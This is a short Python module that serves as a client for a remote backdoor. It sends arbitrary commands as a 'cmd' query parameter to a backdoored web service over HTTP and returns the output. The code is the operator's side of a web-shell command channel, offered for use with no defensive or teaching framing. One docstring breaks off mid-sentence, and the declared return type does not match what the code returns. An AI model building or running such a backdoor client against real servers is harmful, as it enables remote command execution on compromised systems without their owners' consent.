"""This module holds communication between a remote backdoor.
"""

import requests


class Client:
    """A clients is re
    """
    def __init__(self, url: str) -> None:
        """Constructor

        The client will not connect until asked for.

        :param url: Url of the backdoored service
        """
        self.url = url
        self.session = requests.Session()

    def send(self, payload: str) -> requests.Response:
        """Sends a payload to the remote backdoor.

        :param payload: The payload we want to send the backdor

        :returns: The payload result
        """
        return self.session.get(self.url, params={'cmd': payload}).text
